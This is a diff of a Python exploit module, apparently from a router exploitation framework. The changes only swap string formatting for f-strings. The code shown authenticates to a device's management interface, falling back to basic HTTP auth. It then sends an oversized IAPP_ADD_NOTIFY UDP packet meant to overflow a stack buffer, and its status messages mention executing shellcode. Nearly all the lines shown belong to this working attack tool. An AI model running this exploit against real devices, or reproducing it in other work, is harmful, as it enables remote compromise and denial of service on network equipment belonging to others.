@@ -82,10 +82,10 @@ class Exploit(HTTPClient):
 
     def run(self) -> None:
         if not self.check():
-            print_error("Management interface not reachable on {}:{}".format(self.target, self.port))
+            print_error(f"Management interface not reachable on {self.target}:{self.port}")
             return
 
-        print_status("Attempting authentication as '{}' ...".format(self.username))
+        print_status(f"Attempting authentication as '{self.username}' ...")
         token = self._authenticate()
 
         if token is None:
@@ -128,15 +128,15 @@ class Exploit(HTTPClient):
         # Try basic HTTP auth fallback
         import base64
         cred = base64.b64encode(
-            "{}:{}".format(self.username, self.password).encode()
+            f"{self.username}:{self.password}".encode()
         ).decode()
         resp = self.http_request(
             method="GET",
             path="/",
-            headers={"Authorization": "Basic {}".format(cred)},
+            headers={"Authorization": f"Basic {cred}"},
         )
         if resp is not None and resp.status_code == 200:
-            return "basic:{}".format(cred)
+            return f"basic:{cred}"
 
         return None
 
@@ -178,23 +178,19 @@ class Exploit(HTTPClient):
     def _exploit(self, token: str) -> None:
         if self.overflow_size <= 512:
             print_error(
-                "overflow_size ({}) must exceed 512 to overflow the stack buffer".format(
-                    self.overflow_size
-                )
+                f"overflow_size ({self.overflow_size}) must exceed 512 to overflow the stack buffer"
             )
             return
 
         packet = self._build_authed_iapp_packet(token, self.overflow_size)
         print_status(
-            "Sending authenticated IAPP_ADD_NOTIFY overflow ({} bytes) to {}:{}".format(
-                len(packet), self.target, self.iapp_port
-            )
+            f"Sending authenticated IAPP_ADD_NOTIFY overflow ({len(packet)} bytes) to {self.target}:{self.iapp_port}"
         )
 
         response = self._send_udp(packet)
 
         if response:
-            print_info("Response received ({} bytes)".format(len(response)))
+            print_info(f"Response received ({len(response)} bytes)")
         else:
             print_status("No response (daemon may have crashed or executed shellcode)")
 
